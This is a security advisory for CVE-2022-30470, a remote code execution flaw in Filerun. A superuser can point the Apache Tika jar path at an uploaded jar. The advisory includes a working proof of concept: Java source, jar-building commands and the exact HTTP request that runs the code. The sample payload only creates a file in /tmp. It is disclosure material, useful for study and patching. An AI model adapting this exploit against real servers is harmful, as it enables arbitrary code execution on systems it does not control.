# CVE-2022-30470 - RCE (Afian Filerun)

**CVE-ID:** CVE-2022-30470

**Affected Product:** Filerun

**Affected Versions:** Update 20220202

**Vulnerability:** Remote Code Execution

**Vendor URL:** [https://filerun.com](https://filerun.com)

**Status:** Unfixed

**Severity:** Medium


## Description
The application allows the usage of Apache Tika to extract file contents.
The path of the jar file can be configured in the web interface as superuser.

A user can upload any custom jar file to receive remote code execution.


## Proof of Concept
The first step is to create our own jar file.
In this example, we just create a new file in the `/tmp` directory.

The source of `CreateFile.java`:
```java
import java.io.File; 
import java.io.IOException;

public class CreateFile {  
  public static void main(String[] args) {  
    try {  
      File myObj = new File("/tmp/filename.txt");  
      if (myObj.createNewFile()) {  
        System.out.println("File created: " + myObj.getName());  
      } else {  
        System.out.println("File already exists.");  
      }  
    } catch (IOException e) {
      System.out.println("An error occurred.");
      e.printStackTrace();  
    }  
  }  
} 
```

Compile:
```bash
javac CreateFile.java
```

Create a manifest file `manifest.mf`:
```
Manifest-Version: 1.0
Main-Class: CreateFile

```

Finally, create the jar file `proof.jar`:
```
jar cmf manifest.mf proof.jar CreateFile.class
```

Upload the `proof.jar` file to your user files.
Visit the control panel at http://localhost/?module=cpanel#/cpanel/files/searching
Change the path of the tika jar to your own which looks something like this (in the docker version):

```
/user-files/jdoe/proof.jar
```

Click on the "test" button to check your config. The following request is triggered, which results in our new file created in `/tmp`.
```http
POST /?module=cpanel&section=settings&page=file_search&action=testTikaCli HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 145
Origin: http://localhost
Connection: close
Referer: http://localhost/?module=cpanel
Cookie: DOKU_PREFS=ext_enabled%231%23ext_disabled%231%23ext_updatable%231; FileRunSID=ca0c7810ef614b2d994278daf36afaf9
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

search_tika_path=%2Fuser-files%2Fjdoe%2Fproof.jar&search_tika_config_path=&csrf=707f3482362367cab31b77f23b8b4228c23808cd5ffe5e037aea3f3203178a97
```

